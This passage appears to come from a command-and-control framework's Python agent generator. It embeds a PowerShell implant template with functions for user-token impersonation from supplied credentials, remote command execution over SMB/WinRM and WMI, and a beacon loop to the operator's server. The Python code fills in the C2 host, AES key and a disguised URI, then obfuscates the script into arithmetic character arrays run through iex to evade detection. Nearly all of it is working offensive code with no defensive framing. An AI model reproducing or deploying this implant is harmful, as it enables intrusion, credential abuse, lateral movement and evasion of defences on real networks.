        
        if ($sleepValue -lt 1) {
            $sleepValue = 1
        } elseif ($sleepValue -gt 3600) {
            $sleepValue = 3600
        }
        
        $global:sleepTime = $sleepValue
        Write-AgentDebug "Sleep time changed to $global:sleepTime seconds"
        return "[+] Sleep interval set to $global:sleepTime seconds"
    } catch {
        return "[!] Error setting sleep interval: $_. Please provide a valid number between 1-3600."
    }
}

function who {
    try {
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
        $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
        
        $output = "USER INFORMATION`n===============`n"
        $output += "Username: $($currentUser.Name)`n"
        $output += "SID: $($currentUser.User.Value)`n"
        $output += "Admin: $(if ($isAdmin) {'Yes'} else {'No'})`n`n"
        
        $output += "GROUP MEMBERSHIPS`n===============`n"
        foreach ($group in $currentUser.Groups) {
            try {
                $groupName = $group.Translate([System.Security.Principal.NTAccount]).Value
                $output += "$groupName`n"
            } catch {
                $output += "$($group.Value) (No name resolution)`n"
            }
        }
        
        return $output
    } catch {
        return "[!] Error retrieving user information: $_"
    }
}

function make_token {
    param([string]$credentials)
    
    try {
        $credsParts = $credentials -split ":", 2
        $username = $credsParts[0].Trim()
        $password = $credsParts[1].Trim()
        
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class AdvApi {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

        $LOGON32_LOGON_NEW_CREDENTIALS = 9
        $LOGON32_PROVIDER_DEFAULT = 0

        $userParts = $username.Split("\\", 2)
        if ($userParts.Length -eq 2) {
            $domain = $userParts[0]
            $user = $userParts[1]
        } else {
            $domain = ""
            $user = $username
        }

        $token = [IntPtr]::Zero

        $success = [AdvApi]::LogonUser($user, $domain, $password, $LOGON32_LOGON_NEW_CREDENTIALS, $LOGON32_PROVIDER_DEFAULT, [ref]$token)

        if (-not $success -or $token -eq [IntPtr]::Zero) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            return "[!] LogonUser failed: error code $err"
        }

        try {
            $windowsIdentity = New-Object System.Security.Principal.WindowsIdentity($token)
            $impContext = $windowsIdentity.Impersonate()
            
            $global:token = $token
            $global:impContext = $impContext
            $global:windowsIdentity = $windowsIdentity
            
            return "[+] Impersonation successful. Now using identity: $($username)"
        } catch {
            [AdvApi]::CloseHandle($token)
            return "[!] Failed to start impersonation: $_"
        }
    } catch {
        return "[!] Error in make_token: $_"
    }
}

function smb_exec {
    param(
        [string]$target,
        [string]$command,
        [string]$credentials = ""
    )

    try {
        Write-AgentDebug "Attempting SMB execution to target: $target"
        
        if (-not (Test-Connection -ComputerName $target -Count 1 -Quiet -ErrorAction SilentlyContinue)) {
            Write-AgentDebug "Cannot reach target: $target"
            return "[!] smbexec error: Cannot reach target machine."
        }
        
        if ($credentials -and $credentials.Contains(":")) {
            $parts = $credentials -split ":", 2
            $user = $parts[0]
            $pass = $parts[1] | ConvertTo-SecureString -AsPlainText -Force
            $cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
            Write-AgentDebug "Using credentials for user: $user"
            
            $output = Invoke-Command -ComputerName $target -ScriptBlock { 
                param($c) 
                Write-Output "Executing on $env:COMPUTERNAME as $(whoami)"
                cmd.exe /c $c 
            } -ArgumentList $command -Credential $cred -ErrorAction Stop
        } else {
            Write-AgentDebug "Using current user context"
            $output = Invoke-Command -ComputerName $target -ScriptBlock { 
                param($c) 
                Write-Output "Executing on $env:COMPUTERNAME as $(whoami)"
                cmd.exe /c $c 
            } -ArgumentList $command -ErrorAction Stop
        }
        
        Write-AgentDebug "SMB execution successful"
        if ($output) {
            return "[+] smbexec executed successfully. `nOutput:`n$output"
        } else {
            return "[+] smbexec executed successfully. (no output)"
        }
    }
    catch {
        Write-AgentDebug "SMB execution error: $($_.Exception.Message)"
        return "[!] smbexec error: $($_.Exception.Message)"
    }
}

function wmi_exec {
    param(
        [string]$target,
        [string]$command,
        [string]$credentials = ""
    )

    try {
        Write-AgentDebug "Attempting WMI execution to target: $target"
        
        if (-not (Test-Connection -ComputerName $target -Count 1 -Quiet -ErrorAction SilentlyContinue)) {
            Write-AgentDebug "Cannot reach target: $target"
            return "[!] wmiexec error: Cannot reach target machine $target"
        }
        
        if ($credentials -and $credentials.Contains(":")) {
            $parts = $credentials -split ":", 2
            $user = $parts[0]
            $pass = $parts[1] | ConvertTo-SecureString -AsPlainText -Force
            $cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
            Write-AgentDebug "Using credentials for user: $user"
            
            $result = Invoke-WmiMethod -ComputerName $target -Credential $cred -Class Win32_Process -Name Create -ArgumentList $command -ErrorAction Stop
        } else {
            Write-AgentDebug "Using current user context"
            $result = Invoke-WmiMethod -ComputerName $target -Class Win32_Process -Name Create -ArgumentList $command -ErrorAction Stop
        }

        Write-AgentDebug "WMI execution ReturnValue: $($result.ReturnValue)"
        if ($result.ReturnValue -eq 0) {
            return "[+] wmiexec executed successfully. Process ID: $($result.ProcessId)"
        } else {
            $errorMessage = switch ($result.ReturnValue) {
                2 { "Access denied" }
                3 { "Insufficient privilege" }
                8 { "Unknown failure" }
                9 { "Path not found" }
                21 { "Invalid parameter" }
                default { "Error code: $($result.ReturnValue)" }
            }
            Write-AgentDebug "WMI execution failed: $errorMessage"
            return "[!] wmiexec failed: $errorMessage"
        }
    }
    catch {
        Write-AgentDebug "WMI execution error: $($_.Exception.Message)"
        return "[!] wmiexec error: $($_.Exception.Message)"
    }
}

function rev2self {
    try {
        if ($global:impContext -is [System.Security.Principal.WindowsImpersonationContext]) {
            $global:impContext.Undo()
        }

        if ($global:token -is [IntPtr] -and $global:token -ne [IntPtr]::Zero) {
            [AdvApi]::CloseHandle($global:token)
        }

        return "[+] Reverted to self (original user context): $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    } catch {
        return "[!] Error in rev2self: $($_.Exception.Message)"
    }
}

SendInitialFingerprint
execCommandLoop'''
        
        return template
    
    def _generate_arrays(self):
        self.created_arrays = {}
        for _ in range(self.amount_of_arrays):
            lof_copy = self.list_of_chars.copy()
            array_name = "".join([random.choice(string.ascii_letters) for i in range(self.array_name_length)])
            random.shuffle(lof_copy)
            self.created_arrays[array_name] = lof_copy
    
    def _created_arrays_to_ps_string(self):
        created_arrays_strings = ""
        for name, chars_list in self.created_arrays.items():
            created_arrays_strings += f"${name} = ("
            for i, char in enumerate(chars_list):
                created_arrays_strings += f"[char]({self._number_to_arithmetic_expression(ord(char))})"
                if i != len(chars_list) - 1:
                    created_arrays_strings += ","
            created_arrays_strings += ")\n"
        return created_arrays_strings
    
    def _number_to_arithmetic_expression(self, number):
        parts = []
        
        for _ in range(self.number_of_operations):
            num = random.randint(10, 99)
            if random.choice([True, False]):
                parts.append(f'+ {num}')
                number -= num
            else:
                parts.append(f'- {num}')
                number += num
        
        if number > 0:
            parts.append(f'+ {number}')
        elif number < 0:
            parts.append(f'- {-number}')
        
        expression = ' '.join(parts).lstrip('+ ')
        return expression if expression else '0'
    
    def _obfuscate_script_content(self, script_content):
        self._generate_arrays()
        arrays_declaration = self._created_arrays_to_ps_string()
        obfuscated_command_string = "iex (("
        for char in script_content:
            array_name = random.choice(list(self.created_arrays.keys()))
            char_index = self.created_arrays[array_name].index(char)
            obfuscated_command_string += f"${array_name}[{self._number_to_arithmetic_expression(char_index)}],"
        obfuscated_command_string = obfuscated_command_string.rstrip(',')
        obfuscated_command_string += ') -JOIN "")'
        return arrays_declaration + obfuscated_command_string
    
    def _get_server_ip(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                return local_ip
        except Exception:
            try:
                hostname = socket.gethostname()
                return socket.gethostbyname(hostname)
            except Exception:
                return "127.0.0.1"
    
    def generate_agent(self, listener_config, custom_ip=None):
        """Generate an obfuscated PowerShell agent for the given listener.

        listener_config must have:
          - bind_port (int)
          - protocol  (str)  e.g. 'http' / 'https'
          - profile   (dict) with 'http' and 'upstream' sub-dicts
        """
        try:
            profile = listener_config['profile']
            protocol = listener_config.get('protocol', 'http')
            port = listener_config.get('bind_port', 443 if protocol == 'https' else 80)

            http_config = profile.get('http', {})
            user_agent = http_config.get('user_agent', 'Mozilla/5.0')
            uris = http_config.get('uris', [])
            request_headers = http_config.get('request_headers', [])

            aes_key = self.config_loader.get_aes_key()

            main_uri = uris[0] if uris else "/main.c76af346.css"
            main_host = listener_config.get('upstream_host') or 'localhost'
            external_host = listener_config.get('external_host') or main_host

            default_port = 443 if protocol == 'https' else 80
            agent_url = external_host if port == default_port else f"{external_host}:{port}"

            ps_headers = self._build_powershell_headers(request_headers, main_host, user_agent)

            debug_mode = self.config_loader.get_agent_debug_mode()
            debug_value = "$true" if debug_mode else "$false"

            configured_agent = self.agent_template.replace(
                '{{DEBUG_MODE}}', debug_value
            ).replace(
                '{{AGENT_URI}}', main_uri
            ).replace(
                '{{AGENT_PROTOCOL}}', protocol
            ).replace(
                '{{AGENT_HOST}}', main_host
            ).replace(
                '{{AGENT_URL}}', agent_url
            ).replace(
                '{{AES_KEY}}', aes_key
            ).replace(
                '{{SLEEP_TIME}}', str(self.config_loader.get_agent_sleep_time())
            ).replace(
                '{{JITTER}}', str(self.config_loader.get_agent_jitter())
            ).replace(
                '{{AGENT_HEADERS}}', ps_headers
            )

            obfuscated_agent = self._obfuscate_script_content(configured_agent)

            self.logger.log_event(f"AGENT GENERATOR - WebClient obfuscated agent generated! ({self.amount_of_arrays} arrays, {len(self.created_arrays)} mappings)")
            return obfuscated_agent

        except Exception as e:
            error_msg = f"Error generating obfuscated agent: {e}"
            print(f"\033[91m[ERROR]\033[0m AGENT GENERATOR - {error_msg}")
            self.logger.log_event(f"ERR AGENT GENERATOR - {error_msg}")
            return None
    
    def _build_powershell_headers(self, request_headers, main_host, user_agent):
        try:
            headers_dict = {
                "Host": main_host,
                "User-Agent": f'"{user_agent}"',
            }

            for header_line in request_headers:
                if ':' in header_line:
                    key, value = header_line.split(':', 1)
                    key = key.strip()
                    value = value.strip().strip('"')
                    if key.lower() not in ('host', 'user-agent'):
                        headers_dict[key] = f'"{value}"'

            if not any(k.lower() == 'accept' for k in headers_dict):
                headers_dict['Accept'] = '"*/*"'
            
            ps_headers = '$global:headers = @{\n'
            max_key_length = max(len(key) for key in headers_dict.keys())
            
            for key, value in headers_dict.items():
                padding = ' ' * (max_key_length - len(key) + 1)
                if key == "Host":
                    ps_headers += f'    "{key}"{padding}= $global:agentHost\n'
                else:
                    ps_headers += f'    "{key}"{padding}= {value}\n'
            
            ps_headers += '}'
            
            return ps_headers
            
        except Exception as e:
            print(f"\033[91m[ERROR]\033[0m AGENT GENERATOR - Error building headers: {e}")
            return f'''$global:headers = @{{
    "Host"       = $global:agentHost
    "User-Agent" = "{user_agent}"
    "Accept"     = "*/*"
}}'''